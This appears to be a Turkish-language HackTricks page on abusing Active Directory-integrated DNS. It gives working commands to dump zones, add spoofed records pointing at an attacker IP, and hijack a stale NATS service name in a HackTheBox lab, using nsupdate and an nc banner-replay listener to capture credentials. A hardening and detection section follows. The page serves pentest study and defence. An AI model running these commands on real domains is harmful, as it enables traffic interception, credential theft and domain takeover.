# AD DNS Kayıtları

{{#include ../../banners/hacktricks-training.md}}

Varsayılan olarak Active Directory'deki **herhangi bir kullanıcı**, Domain veya Forest DNS zone'larındaki **tüm DNS kayıtlarını** enumerate edebilir; bu işlem zone transfer'e benzer (kullanıcılar, bir AD ortamında DNS zone'un child object'lerini listeleyebilir).

[**adidnsdump**](https://github.com/dirkjanm/adidnsdump) aracı, internal network'lerin recon işlemleri amacıyla zone içindeki **tüm DNS kayıtlarının** **enumeration** ve **export** edilmesini sağlar.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (Nisan 2025), JSON/Greppable (`--json`) çıktısı, çok iş parçacıklı DNS çözümlemesi ve LDAPS'e bağlanırken TLS 1.2/1.3 desteği ekler

Daha fazla bilgi için [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup> okuyun.

---

## Kayıt oluşturma / değiştirme (ADIDNS spoofing)

**Authenticated Users** grubu varsayılan olarak zone DACL'sinde **Create Child** iznine sahip olduğundan, herhangi bir domain hesabı (veya computer account) ek kayıtlar kaydedebilir. Bu, trafiği ele geçirmek, NTLM relay coercion gerçekleştirmek ve hatta domain üzerinde tam denetim elde etmek için kullanılabilir.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py, Impacket ≥0.12.0 ile birlikte gelir)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Yaygın saldırı primitive'leri

1. **Wildcard record** – `*.<zone>`, AD DNS sunucusunu LLMNR/NBNS spoofing'e benzer şekilde kurumsal çapta bir responder'a dönüştürür. NTLM hash'lerini yakalamak veya bunları LDAP/SMB'ye relay etmek için kötüye kullanılabilir.  (WINS-lookup devre dışı bırakılmalıdır.)<sup>[[1]](#references)</sup>
2. **WPAD hijack** – `wpad` ekleyin (veya Global-Query-Block-List'i bypass etmek için attacker host'una işaret eden bir **NS** record ekleyin) ve kimlik bilgilerini toplamak amacıyla dışarı giden HTTP isteklerini transparan şekilde proxy'leyin. Microsoft, wildcard/DNAME bypass'lerini (CVE-2018-8320) patch'ledi, ancak **NS-records hâlâ çalışıyor**.<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – daha önce bir workstation'a ait olan IP adresini ele geçirin; ilişkili DNS entry'si hâlâ çözümlemeye devam eder ve DNS'e hiç dokunmadan resource-based constrained delegation veya Shadow-Credentials saldırılarını mümkün kılar.
4. **DHCP → DNS spoofing** – varsayılan bir Windows DHCP+DNS dağıtımında, aynı subnet üzerindeki kimlik doğrulaması yapılmamış bir attacker, dynamic DNS updates'i tetikleyen sahte DHCP istekleri göndererek mevcut herhangi bir A record'unu (Domain Controller'lar dahil) üzerine yazabilir (Akamai “DDSpoof”, 2023).  Bu, Kerberos/LDAP üzerinde machine-in-the-middle erişimi sağlar ve tam domain takeover'a yol açabilir.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – kontrolünüzdeki bir machine account'un `dNSHostName` değerini değiştirin, eşleşen bir A record register edin ve ardından DC'yi impersonate etmek için bu ad için bir certificate request edin. **Certipy** veya **BloodyAD** gibi araçlar bu akışı tamamen otomatikleştirir.

---

### Stale dynamic records üzerinden internal service hijacking (NATS case study)

Dynamic updates tüm authenticated user'lara açık kaldığında, **register'ı kaldırılmış bir service name yeniden claim edilebilir ve attacker infrastructure'a yönlendirilebilir**. Mirage HTB DC'si, DNS scavenging sonrasında `nats-svc.mirage.htb` hostname'ini açığa çıkardı; dolayısıyla düşük ayrıcalıklı herhangi bir user şunları yapabilirdi:<sup>[[3]](#references)</sup>

1. **Record'un eksik olduğunu doğrulayın** ve `dig` ile SOA'yı öğrenin:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Kontrol ettikleri harici/VPN arayüzüne kaydı yeniden oluşturun:**
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Plaintext service'ı taklit edin**. NATS client'ları kimlik bilgilerini göndermeden önce bir `INFO { ... }` banner'ı görmeyi bekler; bu nedenle gerçek broker'dan alınmış meşru bir banner'ı kopyalamak secrets'ları ele geçirmek için yeterlidir:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Hijacked name'i çözen her client, JSON `CONNECT` frame'ini ( `"user"`/`"pass"` dahil) hemen listener'a leak eder. Saldırgan host'unda resmi `nats-server -V` binary'sini çalıştırmak, log redaction'ını devre dışı bırakmak veya session'ı Wireshark ile sniff etmek, TLS opsiyonel olduğu için aynı plaintext credentials'ı verir.

4. **Captured creds ile pivot edin** – Mirage'da çalınan NATS hesabı JetStream erişimi sağladı ve yeniden kullanılabilir AD username/password bilgilerini içeren geçmiş authentication event'lerini açığa çıkardı.

Bu pattern, güvenli olmayan TCP handshake'lerine dayanan AD-integrated her service için geçerlidir (HTTP APIs, RPC, MQTT vb.): DNS record hijack edildiğinde attacker service'in kendisi olur.

---

## Detection & hardening

* Hassas zone'larda **Authenticated Users** grubunun *Create all child objects* hakkını reddedin ve dynamic update işlemlerini DHCP tarafından kullanılan özel bir hesaba delegate edin.
* Dynamic update gerekiyorsa zone'u **Secure-only** olarak ayarlayın ve DHCP'de **Name Protection** özelliğini etkinleştirin; böylece yalnızca sahibi olan computer object kendi record'unu overwrite edebilir.
* DNS Server event ID'leri 257/252 (dynamic update), 770 (zone transfer) ve `CN=MicrosoftDNS,DC=DomainDnsZones` altındaki LDAP write işlemlerini monitor edin.
* Tehlikeli name'leri (`wpad`, `isatap`, `*`) intentionally-benign bir record ile veya Global Query Block List üzerinden block edin.
* DNS server'larını patch'li tutun – örneğin RCE bug'ları CVE-2024-26224 ve CVE-2024-26231 **CVSS 9.8** seviyesine ulaştı ve Domain Controller'lara karşı remotely exploitable durumdaydı.

## References

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, wildcard/WPAD attacks için hâlâ de-facto reference)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Aralık 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
